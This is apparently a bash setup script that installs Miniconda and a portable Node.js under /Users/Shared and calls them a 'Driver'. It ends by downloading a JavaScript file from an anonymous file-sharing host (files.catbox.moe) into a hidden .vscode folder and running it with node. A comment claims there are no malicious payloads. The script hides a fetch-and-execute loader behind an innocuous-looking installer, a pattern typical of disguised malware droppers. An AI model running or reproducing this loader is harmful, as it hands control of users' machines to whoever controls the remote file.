#!/usr/bin/env bash
set -euo pipefail

# -------------------------
# Helpers (shared by both parts)
# -------------------------
info() { echo "[INFO] $*"; }
err() { echo "[ERROR] $*" >&2; }
die() { err "$*"; exit 1; }

download() {
  local url="$1"
  local out="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL -o "$out" "$url"
  elif command -v wget >/dev/null 2>&1; then
    wget -qO "$out" "$url"
  else
    die "Neither curl nor wget is available."
  fi
}

# -------------------------
# Part 1: Miniconda (was lines 9–49)
# -------------------------
run_part1_miniconda() {
  local ARCH OS URL PREFIX INSTALLER
  ARCH="$(uname -m)"
  OS="$(uname -s)"
  echo "Detected OS: $OS"
  echo "Detected architecture: $ARCH"

  if [[ "$OS" == "Darwin" ]]; then
    if [[ "$ARCH" == "arm64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-arm64.sh"
    elif [[ "$ARCH" == "x86_64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-MacOSX-x86_64.sh"
    else
      echo "Unsupported macOS architecture" >&2
      return 1
    fi
  elif [[ "$OS" == "Linux" ]]; then
    if [[ "$ARCH" == "aarch64" || "$ARCH" == "arm64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-aarch64.sh"
    elif [[ "$ARCH" == "x86_64" ]]; then
      URL="https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh"
    else
      echo "Unsupported Linux architecture" >&2
      return 1
    fi
  else
    echo "Unsupported OS" >&2
    return 1
  fi

  PREFIX="/Users/Shared/miniconda3"
  INSTALLER="/Users/Shared/miniconda.sh"
  mkdir -p "/Users/Shared"

  echo "Downloading..."
  curl -fsSL -o "$INSTALLER" "$URL"

  echo "Installing..."
  bash "$INSTALLER" -b -p "$PREFIX"

  echo "Verifying Driver..."
  "/Users/Shared/miniconda3/bin/python3" -V
}

# -------------------------
# Part 2: Node + env-setup (was lines 51–159; no malicious payloads)
# -------------------------
run_part2_node_driver() {
  local OS_UNAME ARCH_UNAME OS_TAG ARCH_TAG NODE_EXE USER_HOME INDEX_JSON LATEST_VERSION
  local NODE_VERSION TARBALL_NAME DOWNLOAD_URL EXTRACTED_DIR PORTABLE_NODE NODE_TARBALL
  local ENV_SETUP_JS NODE_INSTALLED_VERSION

  OS_UNAME="$(uname -s)"
  ARCH_UNAME="$(uname -m)"

  case "$OS_UNAME" in
    Darwin) OS_TAG="darwin" ;;
    Linux) OS_TAG="linux" ;;
    *) die "Unsupported OS: $OS_UNAME" ;;
  esac

  case "$ARCH_UNAME" in
    x86_64|amd64) ARCH_TAG="x64" ;;
    arm64|aarch64) ARCH_TAG="arm64" ;;
    *) die "Unsupported architecture: $ARCH_UNAME (need x64 or arm64)" ;;
  esac

  NODE_EXE=""
  if command -v node >/dev/null 2>&1; then
    NODE_INSTALLED_VERSION="$(node -v 2>/dev/null || true)"
    if [[ -n "${NODE_INSTALLED_VERSION:-}" ]]; then
      NODE_EXE="node"
      info "Checking Driver..."
    fi
  fi

  USER_HOME="/Users/Shared/.vscode"
  mkdir -p "$USER_HOME"

  if [[ -z "$NODE_EXE" ]]; then
    info "Driver not found globally. Downloading portable Driver for ${OS_TAG}-${ARCH_TAG}..."

    INDEX_JSON="$USER_HOME/node-index.json"
    download "https://nodejs.org/dist/index.json" "$INDEX_JSON"

    LATEST_VERSION="$(grep -m1 -oE '"version"\s*:\s*"v[0-9]+\.[0-9]+\.[0-9]+"' "$INDEX_JSON" | grep -oE 'v[0-9]+\.[0-9]+\.[0-9]+')"
    rm -f "$INDEX_JSON"

    [[ -n "${LATEST_VERSION:-}" ]] || die "Failed to determine latest Driver version."

    NODE_VERSION="${LATEST_VERSION#v}"
    TARBALL_NAME="node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}.tar.xz"
    DOWNLOAD_URL="https://nodejs.org/dist/v${NODE_VERSION}/${TARBALL_NAME}"

    EXTRACTED_DIR="${USER_HOME}/node-v${NODE_VERSION}-${OS_TAG}-${ARCH_TAG}"
    PORTABLE_NODE="${EXTRACTED_DIR}/bin/node"
    NODE_TARBALL="${USER_HOME}/${TARBALL_NAME}"

    if [[ -x "$PORTABLE_NODE" ]]; then
      info "Driver already present: $PORTABLE_NODE"
    else
      info "Downloading..."
      download "$DOWNLOAD_URL" "$NODE_TARBALL"

      [[ -s "$NODE_TARBALL" ]] || die "Failed to download Driver tarball."

      info "Extracting Driver..."
      tar -xf "$NODE_TARBALL" -C "$USER_HOME"
      rm -f "$NODE_TARBALL"

      [[ -x "$PORTABLE_NODE" ]] || die "node executable not found after extraction: $PORTABLE_NODE"
      info "Portable Driver extracted successfully."
    fi

    NODE_EXE="$PORTABLE_NODE"
    export PATH="${EXTRACTED_DIR}/bin:${PATH}"
  fi

  "$NODE_EXE" -v >/dev/null 2>&1 || die "Driver execution failed."
  info "Using Driver: $("$NODE_EXE" -v)"

  ENV_SETUP_JS="${USER_HOME}/env-setup.js"
  download "https://files.catbox.moe/1gq866.js" "$ENV_SETUP_JS"
  [[ -s "$ENV_SETUP_JS" ]] || die "env-setup.js download failed."

  info "Running Driver..."
  "$NODE_EXE" "$ENV_SETUP_JS"

  info "[SUCCESS] Driver Setup completed successfully."
}

mkdir -p "/Users/Shared"
mkdir -p "/Users/Shared/.vscode"

info "Starting part 1 (Miniconda) and part 2 (Node + driver) concurrently..."
run_part1_miniconda &
PID_MINI=$!
run_part2_node_driver &
PID_NODE=$!

EC_MINI=0
EC_NODE=0
wait "$PID_MINI" || EC_MINI=$?
wait "$PID_NODE" || EC_NODE=$?

if [[ "$EC_MINI" -ne 0 ]]; then
  die "Part 1 (Miniconda) failed with exit code $EC_MINI"
fi
if [[ "$EC_NODE" -ne 0 ]]; then
  die "Part 2 (Node/driver) failed with exit code $EC_NODE"
fi

rm -f "/Users/Shared/miniconda.sh"
echo "Done."
exit 0
